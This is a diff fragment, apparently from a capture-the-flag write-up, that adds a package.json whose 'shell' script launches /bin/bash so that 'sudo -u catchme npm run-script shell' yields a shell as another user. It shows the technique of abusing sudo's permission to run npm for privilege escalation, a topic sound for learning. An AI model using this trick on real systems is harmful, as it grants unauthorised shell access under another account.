@@ -152,6 +152,21 @@ cp index.js shell
 
 Now we need a package.json file and chmod to make it executable, then we can run the sudo command to user.
 
+package.json
+```json
+{
+  "name": "shell",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "shell": "/bin/bash"
+  },
+  "author": "",
+  "license": "ISC"
+}
+```
+
 ```bash
 sudo -u catchme npm run-script shell
 ```
